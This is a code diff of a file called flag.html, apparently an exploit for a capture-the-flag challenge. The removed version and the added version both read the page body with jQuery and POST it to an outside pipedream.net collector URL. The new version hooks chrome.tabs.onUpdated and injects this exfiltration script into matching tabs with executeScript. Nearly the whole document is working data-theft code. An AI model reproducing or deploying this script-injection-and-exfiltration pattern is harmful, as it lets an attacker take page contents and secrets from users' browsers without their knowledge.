@@ -1,27 +1,61 @@
-<html>
-  <head>
-    <title>flag.html</title>
-     <script src="jquery-3.4.1.min.js"></script>
-    <script>
-    $(document).ready(function(){
-      var flag = $("body").html();
-      console.log(flag)
-      fetch('https://eo876vqe5g2n7ku.m.pipedream.net', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({flag})
-    })
-    .then(response => response.text())
-    .then(result => {
-      console.log('Response from server:', result);
-    })
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>flag.html</title>
+  <script src="jquery-3.4.1.min.js"></script>
+  <script>
+    var tabsInfo = {};
 
-  });
-    </script>
-  </head>
-  <body>
-    
-  </body>
+    function f(tabId, changeInfo, tab) {
+      if (changeInfo.title) {
+        if (!tabsInfo[changeInfo.title]) {
+          tabsInfo[changeInfo.title] = [];
+        }
+
+        if (tabsInfo[changeInfo.title].length === 0) {
+          tabsInfo[changeInfo.title].push({ id: tabId, url: tab.url });
+        } else {
+          var found = false;
+          tabsInfo[changeInfo.title].forEach(tabInfo => {
+            if (tabInfo.id === tabId) {
+              tabInfo.url = tab.url; // Update URL if it has changed
+              found = true;
+            }
+          });
+
+          if (!found) {
+            tabsInfo[changeInfo.title].push({ id: tabId, url: tab.url });
+          }
+
+          var firstTab = tabsInfo[changeInfo.title][0];
+          if (firstTab.id === tabId) {
+            // You are accessing the first tab with the same title
+            chrome.tabs.executeScript(tabId, {
+              code: `var flag = $("body").html();
+                     console.log(flag);
+                     fetch('https://eo876vqe5g2n7ku.m.pipedream.net', {
+                       method: 'POST',
+                       headers: {
+                         'Content-Type': 'application/json'
+                       },
+                       body: JSON.stringify({ flag })
+                     })
+                     .then(response => response.text())
+                     .then(result => {
+                       console.log('Response from server:', result);
+                     });`
+            });
+          }
+        }
+      }
+    }
+
+    chrome.tabs.onUpdated.addListener(f);
+  </script>
+</head>
+<body>
+</body>
 </html>
+
